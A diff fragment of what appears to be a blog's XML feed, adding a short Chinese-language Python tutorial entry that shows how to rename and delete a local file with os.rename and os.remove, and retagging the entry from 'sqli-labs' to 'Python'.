+<h2 id="修改文件名、删除文件"><a href="#修改文件名、删除文件" class="headerlink" title="修改文件名、删除文件"></a>修改文件名、删除文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-comment">#rename(&quot;原来的文件名&quot;,&quot;要修改的名字&quot;)</span><br>os.rename(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;t.txt&quot;</span>)<br><span class="hljs-comment">#remove(&quot;已修改的文件名&quot;) 删除文件</span><br>os.remove(<span class="hljs-string">&quot;t.txt&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>若不在同一目录，则在原文件名前加上路径</p>
 ]]></content>
       <tags>
-        <tag>sqli-labs</tag>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
